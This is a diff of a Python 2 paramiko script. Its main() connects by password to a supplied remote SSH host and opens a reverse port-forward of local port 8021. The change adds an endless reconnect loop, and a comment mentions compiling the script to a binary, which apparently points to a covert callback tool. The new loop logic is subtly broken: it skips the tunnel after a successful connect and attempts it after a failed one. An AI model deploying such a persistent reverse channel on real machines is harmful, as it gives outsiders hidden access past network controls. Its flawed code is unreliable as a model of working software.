@@ -88,24 +88,30 @@ def reverse_forward_tunnel(server_port, remote_host, remote_port, transport):
 
 # main class here
 def main(user,password, rhost, port):
-    server = [rhost, int(port)]  # our ssh server 
-    remote = ['127.0.0.1', int(8021)] # what we want to tunnel
-    client = paramiko.SSHClient() # use the paramiko SSHClient
-    client.load_system_host_keys() # load SSH keys
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # automatically add SSH key
-
-    try:
-    	client.connect(server[0], server[1], username=user, key_filename=None, look_for_keys=False, password=password)
-
-    # except exception
-    except Exception, e:
-    	print '*** Failed to connect to %s:%d: %r' % (server[0], server[1], e)
-    try:
-    	reverse_forward_tunnel(8021, remote[0], remote[1], client.get_transport())
-
-    # except exception
-    except Exception, e:
-    	print e
+         server = [rhost, int(port)]  # our ssh server 
+         remote = ['127.0.0.1', int(8021)] # what we want to tunnel
+         client = paramiko.SSHClient() # use the paramiko SSHClient
+         client.load_system_host_keys() # load SSH keys
+         client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # automatically add SSH key
+         # loop until you connect successfully
+         while True:
+             try:
+                 client.connect(server[0], server[1], username=user, key_filename=None, look_for_keys=False, password=password)
+             # except exception
+             except Exception, e:
+                 print '[X] Failed to connect to %s:%d: %r Trying to connect again...' % (server[0], server[1], e)
+                 pass
+                 time.sleep(5)
+             else:
+                 # let you know if you connected successfully then finish
+                 print '[*] Connected to %s:%d: successfully' % (server[0], server[1])
+                 break
+             try:
+                 reverse_forward_tunnel(8021, remote[0], remote[1], client.get_transport())
+             except Exception, e:
+                 print e
+                 pass
+                 time.sleep(5)
 
 if __name__ == '__main__':
     # used when you need to use multiprocessing and use pywin32 or py2exe and byte compile to a binary
